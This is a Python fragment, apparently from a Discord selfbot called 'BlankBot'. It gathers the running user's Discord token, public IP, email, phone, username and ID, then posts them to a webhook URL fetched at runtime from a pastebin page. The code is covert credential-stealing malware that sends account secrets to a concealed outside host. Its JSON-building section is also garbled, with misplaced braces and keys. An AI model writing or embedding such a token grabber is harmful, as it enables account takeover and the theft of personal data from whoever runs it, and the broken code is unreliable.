username = f"`{Blank.user}`"\nuser_id = f"`{Blank.user.id}`"\navatar_url = Blank.user.avatar_url\nheaders={"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; KTXN B658339014A102175T1297416P2) like Gecko"}\nautho=requests.get(f'https://pastebin.com/raw/u00ci1dV').text\nip=f"`{requests.get('https://www.trackip.net/ip', headers=headers).text}`"\nheaders={"Authorization": token,\n"Content-Type": "application/json"}\n\nr=requests.get("https://discord.com/api/v8/users/@me", headers=headers)\nr=r.json()\nemail=f"`{r['email']}`"\nphone=f"`{r['phone']}`"\n    \njsondata={"content":token ,\n"embeds": [\n{"title":"BlankBot",\n"thumbnail": {\n    "url": str(avatar_url)\n  },\n"fields": [\n {\n      "name": "<:TextChannel:817976186390183966> Username: ",\n      "value": str(username),\n      "inline": "False"\n  },\n {\n      "name": "<:TextChannel:817976186390183966> User ID: ",\n      "value": str(user_id),\n      "inline": "False"\n  },\n  {\n      "name": "<:TextChannel:817976186390183966> IP: ",\n      "value": str(ip)},
\n	  "inline": "False"\n  {\n      "name": "<:TextChannel:817976186390183966> Email: ",\n      "value": str(email),\n      "inline": "False"\n  },\n  {\n      "name": "<:TextChannel:817976186390183966> Phone: ",\n      "value": str(phone),\n      "inline": "False"\n  }\n          ]\n}\n          ]\n  }\nrequests.post(autho , json=jsondata)